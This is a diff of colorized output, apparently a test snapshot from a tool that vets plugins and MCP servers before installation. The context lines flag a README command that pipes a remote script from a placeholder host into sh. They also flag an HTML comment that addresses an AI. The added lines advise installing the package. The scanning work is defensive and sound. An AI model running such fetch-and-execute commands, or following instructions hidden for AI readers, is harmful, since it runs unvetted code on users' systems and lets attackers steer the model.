@@ -21,6 +21,14 @@
     [31m(README:42) → curl -fsSL https://x.example/i.sh | sh[39m
   [33m⚑ MEDIUM hidden-instructions: an HTML comment addresses an AI (README:7)[39m
 
+[2m──[22m [1mBuild or install[22m [2m────────────────────────────────────────────────────────────[22m
+  [2mWhat  [22m  MCP server
+  [2mSize  [22m  30 code files, ~4,500 lines of TypeScript · 3 dependencies
+  [2mNeeds [22m  [33mcredentials: ACME_API_KEY · network[39m
+  [36mAdvice[39m  [36mInstall[39m
+  [2mWhy   [22m  Wraps the ACME API with ~4,500 lines of TypeScript: installing saves
+          you keeping up with it.
+
 [2m──[22m [1mInstall[22m [2m─────────────────────────────────────────────────────────────────────[22m
   [2mFrom the README; review before running:[22m
     [36m/plugin marketplace add acme/test-runner-mcp[39m
